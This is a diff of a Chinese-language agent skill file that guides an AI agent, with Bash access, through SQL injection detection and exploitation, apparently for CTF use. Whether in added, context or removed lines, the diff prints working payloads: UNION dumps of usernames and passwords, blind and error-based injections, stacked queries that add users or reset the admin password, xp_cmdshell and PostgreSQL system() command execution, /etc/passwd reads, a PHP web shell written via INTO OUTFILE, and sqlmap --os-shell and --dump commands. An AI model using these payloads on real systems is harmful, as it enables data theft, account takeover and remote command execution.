@@ -1,12 +1,44 @@
 ---
 name: sqli
-description: SQL 注入漏洞检测与利用。当目标存在数据库查询、搜索功能、登录表单、URL 参数时使用。包括 UNION、报错、盲注等技术。
+description: "通过 UNION、报错、布尔盲注、时间盲注等技术检测和利用 SQL 注入漏洞，提取数据库敏感数据并尝试提权。当目标存在数据库查询、搜索功能、登录表单、URL 参数或 HTTP 头注入点时使用。"
 allowed-tools: Bash, Read, Write
 ---
 
 # SQL 注入 (SQL Injection)
 
 通过在用户输入中注入 SQL 代码，操纵数据库查询，实现数据泄露、认证绕过或命令执行。
+
+## 安全与范围
+
+- **仅在授权 CTF 环境中使用**，确认目标在比赛范围内
+- **停止条件**：已获取 flag、已确认无注入点、已穷尽所有注入技术
+- **升级条件**：遇到未知 WAF 或异常防护机制时，请求顾问协助
+- **文件写入前**：确认目标路径可写且不会破坏环境稳定性
+- **命令执行前**：优先使用只读查询，仅在需要提权或获取 flag 时执行系统命令
+
+## 工作流程
+
+```
+发现参数 → 检测注入点 → 判断数据库类型 → 选择注入技术 → 提取数据 → 尝试提权
+```
+
+### 决策流程图
+
+1. **发现可疑参数** → 执行基础测试（单引号、逻辑测试）
+2. **有报错信息？**
+   - 是 → 判断数据库类型 → 尝试报错注入
+   - 否 → 继续步骤 3
+3. **页面有差异？**（AND 1=1 vs AND 1=2）
+   - 是 → 布尔盲注
+   - 否 → 继续步骤 4
+4. **时间盲注测试**（SLEEP/pg_sleep/WAITFOR DELAY）
+   - 有延迟 → 时间盲注
+   - 无延迟 → 无注入点，尝试其他参数或技术
+5. **确认注入后** → 尝试 UNION 注入确定列数
+6. **UNION 可用？**
+   - 是 → UNION 注入提取数据
+   - 否 → 使用已确认的盲注技术
+7. **[验证点]** 确认已获取有效数据后 → 尝试提权或读取 flag
 
 ## 常见指示器
 
@@ -37,6 +69,8 @@ curl "http://target.com/page?id=1 AND 1=1"
 curl "http://target.com/page?id=1 AND 1=2"
 ```
 
+**[验证点]** 比较响应差异：报错信息、页面内容变化、HTTP 状态码。无差异则该参数可能不存在注入。
+
 ### 2. 时间盲注测试
 
 ```bash
@@ -49,6 +83,8 @@ curl "http://target.com/page?id=1; SELECT pg_sleep(5)"
 # MSSQL
 curl "http://target.com/page?id=1; WAITFOR DELAY '0:0:5'"
 ```
+
+**[验证点]** 测量响应时间。延迟 >= 4 秒即确认时间盲注存在。同时根据哪个 payload 生效来判断数据库类型。
 
 ## 攻击向量
 
@@ -71,25 +107,14 @@ curl "http://target.com/page?id=1; WAITFOR DELAY '0:0:5'"
 ' UNION SELECT username,password,3 FROM users--
 ' UNION SELECT table_name,column_name,3 FROM information_schema.columns--
 
--- MySQL 信息收集
+-- 信息收集（MySQL）
 ' UNION SELECT @@version,user(),database()--
 ' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
 ```
 
 ### 报错注入
 
-```sql
--- MySQL
-' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))--
-' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--
-' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
-
--- PostgreSQL
-' AND 1=CAST((SELECT version()) AS INT)--
-
--- MSSQL
-' AND 1=CONVERT(INT,(SELECT @@version))--
-```
+参见数据库特定语法：[MYSQL.md](MYSQL.md)、[POSTGRESQL.md](POSTGRESQL.md)、[MSSQL.md](MSSQL.md)
 
 ### 布尔盲注
 
@@ -109,32 +134,13 @@ curl "http://target.com/page?id=1; WAITFOR DELAY '0:0:5'"
 
 ### 时间盲注
 
-```sql
--- MySQL
-' AND IF(1=1,SLEEP(5),0)--
-' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--
-
--- PostgreSQL
-'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
-
--- MSSQL
-'; IF (1=1) WAITFOR DELAY '0:0:5'--
-```
+参见数据库特定语法：[MYSQL.md](MYSQL.md)、[POSTGRESQL.md](POSTGRESQL.md)、[MSSQL.md](MSSQL.md)
 
 ### 堆叠查询
 
-```sql
--- MySQL (需要 mysqli_multi_query)
-'; INSERT INTO users VALUES('hacker','password')--
-'; UPDATE users SET password='hacked' WHERE username='admin'--
+参见数据库特定语法：[MYSQL.md](MYSQL.md)、[POSTGRESQL.md](POSTGRESQL.md)、[MSSQL.md](MSSQL.md)
 
--- MSSQL
-'; EXEC xp_cmdshell 'whoami'--
-'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--
-
--- PostgreSQL
-'; CREATE TABLE test(data text); COPY test FROM '/etc/passwd'--
-```
+**[验证点]** 堆叠查询可执行写操作（INSERT/UPDATE/DELETE）。执行前确认操作必要性，优先使用 SELECT 只读查询。
 
 ### 认证绕过
 
@@ -190,6 +196,8 @@ sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --columns
 sqlmap -u "http://target.com/page?id=1" -D database_name -T users -C username,password --dump --batch
 ```
 
+**[验证点]** 导出数据后，检查是否包含 flag 格式的字符串。如果未找到，继续枚举其他表。
+
 ### 高级选项
 
 ```bash
@@ -211,6 +219,8 @@ sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between --batch
 sqlmap -u "http://target.com/page?id=1" --os-shell --batch
 sqlmap -u "http://target.com/page?id=1" --sql-shell --batch
 ```
+
+**[验证点]** 使用 `--os-shell` 前，确认已穷尽数据库层面的数据提取。系统命令执行是最后手段。
 
 ## 绕过技术
 
@@ -267,91 +277,18 @@ SEL/**/ECT, UN/**/ION
 
 ## 数据库特定语法
 
-### MySQL
+详细的数据库特定语法参考已拆分为独立文件：
 
-```sql
--- 版本
-SELECT @@version
-SELECT version()
-
--- 当前用户
-SELECT user()
-SELECT current_user()
-
--- 当前数据库
-SELECT database()
-
--- 所有数据库
-SELECT schema_name FROM information_schema.schemata
-
--- 所有表
-SELECT table_name FROM information_schema.tables WHERE table_schema=database()
-
--- 所有列
-SELECT column_name FROM information_schema.columns WHERE table_name='users'
-
--- 读文件
-SELECT LOAD_FILE('/etc/passwd')
-
--- 写文件
-SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'
-```
-
-### PostgreSQL
-
-```sql
--- 版本
-SELECT version()
-
--- 当前用户
-SELECT current_user
-
--- 当前数据库
-SELECT current_database()
-
--- 所有数据库
-SELECT datname FROM pg_database
-
--- 所有表
-SELECT tablename FROM pg_tables WHERE schemaname='public'
-
--- 读文件
-CREATE TABLE test(data text); COPY test FROM '/etc/passwd'; SELECT * FROM test;
-
--- 命令执行
-CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
-SELECT system('id');
-```
-
-### MSSQL
-
-```sql
--- 版本
-SELECT @@version
-
--- 当前用户
-SELECT user_name()
-SELECT system_user
-
--- 当前数据库
-SELECT db_name()
-
--- 所有数据库
-SELECT name FROM master..sysdatabases
-
--- 所有表
-SELECT name FROM sysobjects WHERE xtype='U'
-
--- 命令执行
-EXEC xp_cmdshell 'whoami'
-```
+- [MySQL 语法参考](MYSQL.md) — 信息收集、文件操作、报错注入、时间盲注、堆叠查询
+- [PostgreSQL 语法参考](POSTGRESQL.md) — 信息收集、文件操作、命令执行、报错注入
+- [MSSQL 语法参考](MSSQL.md) — 信息收集、命令执行（xp_cmdshell）、报错注入
 
 ## 最佳实践
 
-1. 先用单引号测试是否存在注入点
+1. **[验证点]** 先用单引号测试是否存在注入点，确认响应异常后再继续
 2. 确定数据库类型（通过报错信息或特定函数）
 3. 确定注入类型（UNION、报错、盲注）
 4. 使用 sqlmap 自动化利用
 5. 如果 sqlmap 失败，手工构造 payload
 6. 注意 WAF 绕过，使用 tamper 脚本
-7. 提取敏感数据后尝试提权（os-shell）
+7. **[验证点]** 提取敏感数据后检查是否包含 flag，确认后再尝试提权（os-shell）
